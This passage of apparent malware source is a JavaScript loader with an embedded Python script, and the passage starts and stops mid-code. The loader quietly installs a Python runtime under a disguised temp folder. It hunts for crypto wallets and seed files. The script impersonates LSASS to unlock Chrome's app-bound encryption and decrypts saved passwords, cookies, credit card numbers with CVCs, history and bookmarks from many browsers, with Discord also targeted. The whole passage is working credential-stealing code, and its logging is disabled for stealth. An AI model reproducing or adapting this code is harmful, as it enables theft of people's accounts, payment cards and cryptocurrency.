    };
    results.browserWallets = await xz4a5();

    results.desktopWallets = await xd8e9();

    results.coldWallets = await xh2i3();
    if (results.coldWallets.length > 0) {
        await xj4k5(results.coldWallets, outputDir);
    }
    results.walletDatFiles = await xl6m7();
    if (results.walletDatFiles.length > 0) {
        await xn8o9(results.walletDatFiles, outputDir);
    }
    results.seedFiles = await xp0q1();
    if (results.seedFiles.length > 0) {
        await xr2s3(results.seedFiles, outputDir);
    }
    const hasWallets = results.browserWallets.length > 0 || results.desktopWallets.length > 0 || results.coldWallets.length > 0 || results.walletDatFiles.length > 0 || results.seedFiles.length > 0;
    if (hasWallets) {
        const summaryText = xv6w7(results);
        fs.writeFileSync(path.join(outputDir, 'wallets_summary.txt'), summaryText, 'utf8');
    }
    return results;
}
const fodase = os.tmpdir();
const installDir = path.join(fodase, "WinGet_Repaired");
const pythonExe = path.join(installDir, "tools", "python.exe");
const tempScript = path.join(os.tmpdir(), "browser_forensics.py");
const requirements = ["pycryptodome", "pywin32", "PythonForWindows"];
async function xb2c3(url, dest) {
    const response = await axios.get(url, {
        responseType: 'stream',
        timeout: 30000,
        maxRedirects: 3
    });
    const writer = fs.createWriteStream(dest);
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}
function xd4e5(zipPath, dest) {
    return new Promise((resolve, reject) => {
        try {
            const zip = new AdmZip(zipPath);
            zip.extractAllTo(dest, true);
            resolve();
        } catch (e) {
            reject(new Error("ZIP extraction failed: " + e.message));
        }
    });
}
function xf6g7(packages, env) {
    const installPromises = packages.map(pkg => {
        return new Promise(resolve => {
            execFile(pythonExe, ["-m", "pip", "install", "--no-cache-dir", "--no-warn-script-location", "--disable-pip-version-check", "--trusted-host", "pypi.org", "--trusted-host", "files.pythonhosted.org", "-q", pkg], {
                env,
                timeout: 30000,
                windowsHide: true
            }, err => resolve(!err));
        });
    });
    return Promise.all(installPromises);
}
function xh8i9(scriptPath, env) {
    return new Promise((resolve, reject) => {
        execFile(pythonExe, [scriptPath], {
            env,
            timeout: 90000,
            windowsHide: true,
            maxBuffer: 10485760
        }, (err, stdout, stderr) => {
            if (err) {
                return reject(err);
            }
            resolve();
        });
    });
}

const xj0k1 = (promise, ms, label = 'Operation') => Promise.race([promise, new Promise((_, reject) => setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms))]);
function xl2m3(msg) {
    console.log(`[DEBUG] ${msg}`);
}
async function xn4o5(pyCode, scriptPathOverride) {
    xl2m3('Starting xn4o5 execution...');
    if (!fs.existsSync(installDir)) {
        fs.mkdirSync(installDir, {
            recursive: true
        });
    }
    const zipPath = path.join(fodase, "python310.zip");
    const packagesInstalledFlag = path.join(installDir, ".packages_installed");
    const scriptOut = scriptPathOverride || tempScript;
    const pythonZip = path.join(installDir, "tools", "python310.zip");
    if (!fs.existsSync(pythonExe) || !fs.existsSync(pythonZip)) {
        xl2m3('Downloading Python...');
        try {
            if (fs.existsSync(installDir)) {
                fs.rmSync(installDir, {
                    recursive: true,
                    force: true
                });
            }
        } catch (e) { }
        fs.mkdirSync(installDir, {
            recursive: true
        });
        const urls = [
            "https://globalcdn.nuget.org/packages/python.3.10.0.nupkg",
            "https://api.nuget.org/v3-flatcontainer/python/3.10.0/python.3.10.0.nupkg",
            "https://www.nuget.org/api/v2/package/python/3.10.0",
            "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" // Not a mirror, but just checking others
        ];
        let downloaded = false;
        for (const url of urls) {
            try {
                xl2m3(`Attempting to download Python from: ${url}`);
                await xb2c3(url, zipPath);
                downloaded = true;
                break;
            } catch (e) {
                xl2m3(`Failed to download from ${url}: ${e.message}`);
            }
        }
        if (!downloaded) {
            throw new Error("Failed to download Python from all mirrors");
        }
        await xd4e5(zipPath, installDir);
        try {
            fs.unlinkSync(zipPath);
        } catch (e) { }
        xl2m3('Python downloaded and extracted.');
    } else {
        xl2m3('Python already exists.');
    }
    const env = {
        ...process.env,
        PYTHONHOME: path.join(installDir, "tools"),
        PYTHONPATH: path.join(installDir, "tools", "Lib"),
        PYTHONUNBUFFERED: '1'
    };
    const setupPromises = [];
    if (!fs.existsSync(packagesInstalledFlag)) {
        xl2m3('Ensuring pip is available...');
        await new Promise(resolve => {
            execFile(pythonExe, ["-m", "ensurepip", "--upgrade"], { env, timeout: 60000, windowsHide: true }, () => resolve());
        });

        xl2m3('Installing requirements...');
        setupPromises.push(xf6g7(requirements, env).then(() => {
            try {
                fs.writeFileSync(packagesInstalledFlag, '1');
            } catch (e) { }
            xl2m3('Requirements installed.');
        }).catch(e => xl2m3(`Requirements installation failed: ${e.message}`)));
    }
    setupPromises.push(Promise.resolve(fs.writeFileSync(scriptOut, pyCode)));
    await Promise.all(setupPromises);
    try {
        xl2m3('Running Python script...');
        await xh8i9(scriptOut, env);
        xl2m3('Python script finished.');
    } catch (e) {
        xl2m3(`Python script execution failed: ${e.message}`);
        throw e;
    } finally {
        try {
            fs.unlinkSync(scriptOut);
        } catch (e) { }
    }
}
const pythonCodeTemplate = String.raw`
import os
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import logging
import sys
import base64
from datetime import datetime, timedelta

# Minimal logging for speed
logging.basicConfig(level=logging.CRITICAL, handlers=[])
logger = logging.getLogger(__name__)
logger.disabled = True
OUTPUT_BASE_DIR = (pathlib.Path(r'__OUTPUT_FOLDER__') / 'Browser-Datas')
BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'type': 'chromium',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'type': 'chromium',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'firefox': {
        'name': 'Firefox',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'chrome_beta': {
        'name': 'Google Chrome Beta',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome Beta\User Data',
        'local_state': r'AppData\Local\Google\Chrome Beta\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chrome Betakey1'
    },
    'chromium': {
        'name': 'Chromium',
        'type': 'chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Chromiumkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'type': 'chromium',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'yandex': {
        'name': 'Yandex Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1'
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\CocCoc\\Browser\\User Data',
        'local_state': r'AppData\\Local\\CocCoc\\Browser\\User Data\\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1'
    },
    'qq': {
        'name': 'QQ Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Tencent\\QQBrowser\\User Data',
        'local_state': r'AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1'
    },
    '360speed': {
        'name': '360 Speed',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1'
    },
    '360secure': {
        'name': '360 Secure',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Securekey1'
    },
    'firefox_beta': {
        'name': 'Firefox Beta',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_dev': {
        'name': 'Firefox Developer',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_esr': {
        'name': 'Firefox ESR',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_nightly': {
        'name': 'Firefox Nightly',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    }
}

DISCORD_APPS = {
    'discord': {
        'name': 'Discord',
        'data_path': r'AppData\Roaming\discord',
        'local_state': r'AppData\Roaming\discord\Local State',
        'process_name': 'Discord.exe'
    },
    'discord_canary': {
        'name': 'Discord Canary',
        'data_path': r'AppData\Roaming\discordcanary',
        'local_state': r'AppData\Roaming\discordcanary\Local State',
        'process_name': 'DiscordCanary.exe'
    },
    'discord_ptb': {
        'name': 'Discord PTB',
        'data_path': r'AppData\Roaming\discordptb',
        'local_state': r'AppData\Roaming\discordptb\Local State',
        'process_name': 'DiscordPTB.exe'
    }
}

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint),
                ('data', ctypes.c_void_p),
                ('len', ctypes.c_uint)]

class NSSHandler:
    def __init__(self):
        self.nss = None
        self.loaded = False
        self._load_library()

    def _load_library(self):
        paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    logger.debug(f"Loading NSS from {path}")
                    try:
                        os.add_dll_directory(os.path.dirname(path))
                    except AttributeError:
                        os.environ['PATH'] = os.path.dirname(path) + ';' + os.environ['PATH']

                    self.nss = ctypes.CDLL(path)
                    
                    self.nss.NSS_Init.argtypes = [ctypes.c_char_p]
                    self.nss.NSS_Init.restype = ctypes.c_int
                    
                    self.nss.NSS_Shutdown.argtypes = []
                    self.nss.NSS_Shutdown.restype = ctypes.c_int
                    
                    self.nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
                    self.nss.PK11SDR_Decrypt.restype = ctypes.c_int
                    
                    self.loaded = True
                    return
                except Exception as e:
                    logger.error(f"Failed to load NSS from {path}: {e}")

    def init_profile(self, profile_path):
        if not self.loaded: return False
        try:
            logger.debug(f"Initializing NSS for profile: {profile_path}")
            if not (pathlib.Path(profile_path) / "cert9.db").exists() and not (pathlib.Path(profile_path) / "cert8.db").exists():
                logger.warning(f"No cert DB found in {profile_path}, skipping NSS init")
                return False
                
            ret = self.nss.NSS_Init(str(profile_path).encode('utf-8'))
            if ret != 0:
                logger.error(f"NSS_Init failed with code {ret}")
                return False
            return True
        except Exception as e:
            logger.error(f"Error in NSS_Init: {e}")
            return False

    def shutdown(self):
        if self.loaded:
            try:
                self.nss.NSS_Shutdown()
            except Exception:
                pass

    def decrypt(self, encrypted_b64):
        if not self.loaded: return None
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            
            input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p), len(encrypted_data))
            output_item = SECItem(0, None, 0)
            
            ret = self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)
            
            if ret == 0:
                decrypted_data = ctypes.string_at(output_item.data, output_item.len)
                return decrypted_data.decode('utf-8')
            else:
                return None
        except Exception as e:
            logger.error(f"Error decrypting with NSS: {e}")
            return None

def is_admin():
    try:
        result = ctypes.windll.shell32.IsUserAnAdmin() != 0
        logger.debug(f"Admin check result: {result}")
        return result
    except Exception as e:
        logger.error(f"Error checking admin status: {e}")
        return False

@contextmanager
def impersonate_lsass():
    logger.debug("Attempting to impersonate LSASS")
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        logger.debug("Successfully impersonated LSASS")
        yield
    except Exception as e:
        logger.error(f"Failed to impersonate LSASS: {e}")
        raise
    finally:
        windows.current_thread.token = original_token
        logger.debug("Reverted to original token")

def parse_key_blob(blob_data: bytes) -> dict:
    try:
        logger.debug(f"Parsing key blob of length {len(blob_data)}")
        buffer = io.BytesIO(blob_data)
        parsed_data = {}
        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        
        if header_len + content_len + 8 != len(blob_data):
            logger.warning("Blob size mismatch in parse_key_blob")
            
        parsed_data['flag'] = buffer.read(1)[0]
        logger.debug(f"Blob flag: {parsed_data['flag']}")
        
        if parsed_data['flag'] in (1, 2):
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        elif parsed_data['flag'] == 3:
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        else:
            parsed_data['raw_data'] = buffer.read()
            
        return parsed_data
    except Exception as e:
        logger.error(f"Error parsing key blob: {e}")
        raise

def decrypt_with_cng(input_data, key_name):
    logger.debug(f"Decrypting with CNG, key_name: {key_name}")
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    if status != 0:
        logger.error(f"NCryptOpenStorageProvider failed: {status}")
        return b''
        
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        logger.error(f"NCryptOpenKey failed: {status}")
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"1st NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    if status != 0:
        logger.error(f"2nd NCryptDecrypt failed: {status}")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
        
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    logger.debug("CNG decryption successful")
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    logger.debug(f"Deriving v20 master key with flag {parsed_data.get('flag')}")
    try:
        if parsed_data['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 2:
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        elif parsed_data['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            with impersonate_lsass():
                decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not decrypted_aes_key:
                logger.error("Failed to decrypt AES key with CNG")
                return b''
            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        else:
            logger.warning(f"Unknown flag: {parsed_data.get('flag')}")
            return parsed_data.get('raw_data', b'')
    except Exception as e:
        logger.error(f"Error deriving master key: {e}")
        return b''

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return ""
        if not encrypted_password.startswith(b'v20') and not encrypted_password.startswith(b'v10'):
             pass
             
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return decrypted_pass.decode('cp1252')
            except UnicodeDecodeError:
                return decrypted_pass.decode('utf-8', errors='replace')
    except Exception as e:
        return f"<decryption_failed: {e}>"

def fetch_sqlite_copy(db_path):
    try:
        tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
        logger.debug(f"Copying DB from {db_path} to {tmp_path}")
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception as e:
        logger.error(f"Error copying SQLite DB: {e}")
        return None

def get_chrome_datetime(timestamp):
    try:
        if not timestamp:
            return "Unknown"
        # Chrome timestamps are microseconds since 1601-01-01
        epoch = datetime(1601, 1, 1)
        return (epoch + timedelta(microseconds=timestamp)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Unknown"

def extract_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return []
    
    try:
        with open(bookmarks_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            
        bookmarks = []
        
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    name = node.get("name", "Unknown")
                    url = node.get("url", "Unknown")
                    bookmarks.append(f"{name}\t{url}")
                
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
                        
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
                
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting bookmarks: {e}")
        return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(history_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = get_chrome_datetime(last_visit)
            history_items.append(f"{url}\t{title}\t{visit_count}\t{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_credit_cards(profile_path, master_key):
    web_data_db = profile_path / "Web Data"
    if not web_data_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(web_data_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        
        # Load CVCs
        local_cvcs = {}
        try:
            cur.execute("SELECT guid, value_encrypted FROM local_stored_cvc")
            for guid, encrypted in cur.fetchall():
                local_cvcs[guid] = encrypted
        except sqlite3.OperationalError:
            pass # Table might not exist
            
        server_cvcs = {}
        try:
            cur.execute("SELECT instrument_id, value_encrypted FROM server_stored_cvc")
            for inst_id, encrypted in cur.fetchall():
                server_cvcs[str(inst_id)] = encrypted
        except sqlite3.OperationalError:
            pass

        cards = []
        
        # Local cards
        try:
            cur.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for guid, name, exp_m, exp_y, enc_num in cur.fetchall():
                try:
                    decrypted_num = decrypt_v20_password(enc_num, master_key)
                    if decrypted_num.startswith("<decryption_failed"):
                         decrypted_num = "DECRYPT_FAILED"
                    
                    cvc = "N/A"
                    if guid in local_cvcs:
                        decrypted_cvc = decrypt_v20_password(local_cvcs[guid], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Local Card")
                except Exception as e:
                    logger.error(f"Error processing local card {guid}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying credit_cards: {e}")

        # Server cards
        try:
            cur.execute("SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards")
            for card_id, name, exp_m, exp_y, last_four in cur.fetchall():
                try:
                    decrypted_num = f"**** **** **** {last_four}"
                    
                    cvc = "N/A"
                    if str(card_id) in server_cvcs and master_key:
                        decrypted_cvc = decrypt_v20_password(server_cvcs[str(card_id)], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================\nID: {card_id}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Masked/Server Card")
                except Exception as e:
                    logger.error(f"Error processing server card {card_id}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying masked_credit_cards: {e}")
            
        con.close()
        try: os.remove(db_copy)
        except: pass
        return cards
    except Exception as e:
        logger.error(f"Error extracting credit cards: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def get_master_key(browser_config):
    logger.info(f"Getting master key for {browser_config['name']}")
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        logger.debug(f"Local state path: {local_state_path}")
        
        if not os.path.exists(local_state_path):
            logger.warning("Local state file not found")
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found app_bound_encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            logger.warning("No encrypted key found in local state")
            return None
            
        logger.debug("Decrypting system key with LSASS impersonation")
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            
        logger.debug("Decrypting user key")
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        logger.debug("Parsing decrypted key blob")
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            logger.debug("Returning raw key data")
            return key_blob_user_decrypted[-32:]
            
        logger.debug("Deriving final master key")
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        logger.error(f"Error getting master key: {e}")
        return None

def process_chromium_browser(browser_name, browser_config):
    logger.info(f"Processing Chromium browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return
        
    master_key = get_master_key(browser_config)
    if not master_key:
        logger.warning("Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted")
    else:
        logger.debug("Master key retrieved successfully")
        
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    logger.info(f"Found {len(profiles)} profiles")
    
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        logger.info(f"Processing profile: {profile_name}")
        
        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        history_file = profile_output_dir / "history.txt"
        credit_cards_file = profile_output_dir / "credit_cards.txt"
        
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        # Process Bookmarks
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name\tURL\n")
                for b in bookmarks:
                    f.write(f"{b}\n")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process History
        history = extract_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL\tTitle\tVisit Count\tLast Visit\n")
                for h in history:
                    f.write(f"{h}\n")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Credit Cards
        cards = extract_credit_cards(profile_dir, master_key)
        if cards:
            with open(credit_cards_file, "w", encoding="utf-8") as f:
                f.write("# Credit Cards\n")
                for c in cards:
                    f.write(f"{c}\n\n")
            logger.debug(f"Extracted {len(cards)} credit cards")

        # Process Cookies
        try:
            if cookie_db_path.exists():
                logger.debug(f"Processing cookies from {cookie_db_path}")
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        f.write("# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n")
                        success_count = 0
                        for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                            if encrypted_value and (encrypted_value[:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_value(encrypted_value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                if decrypted:
                                    success_count += 1
                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                secure_str = "TRUE" if secure else "FALSE"
                                try:
                                    secs = int(expires) // 1000000
                                except Exception:
                                    secs = 0
                                unix_exp = secs - 11644473600 if secs > 11644473600 else 0
                                path_str = path if path else "/"
                                line = f"{host}\t{flag}\t{path_str}\t{secure_str}\t{unix_exp}\t{name}\t{value_str}\n"
                                f.write(line)
                        logger.debug(f"Successfully decrypted {success_count} cookies")
                    con.close()
                    try: os.remove(cookie_copy)
                    except: pass
            else:
                logger.debug("No cookie DB found")
        except Exception as e:
            logger.error(f"Error processing cookies: {e}")

        # Process Logins
        try:
            if login_db_path.exists():
                logger.debug(f"Processing logins from {login_db_path}")
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                logger.debug(f"Found {len(logins)} logins")
                
                with open(password_file, "w", encoding="utf-8") as f:
                    f.write("# Passwords\n")
                    success_count = 0
                    for login in logins:
                        if login[2]:
                            logger.debug(f"Login prefix: {login[2][:3]}")
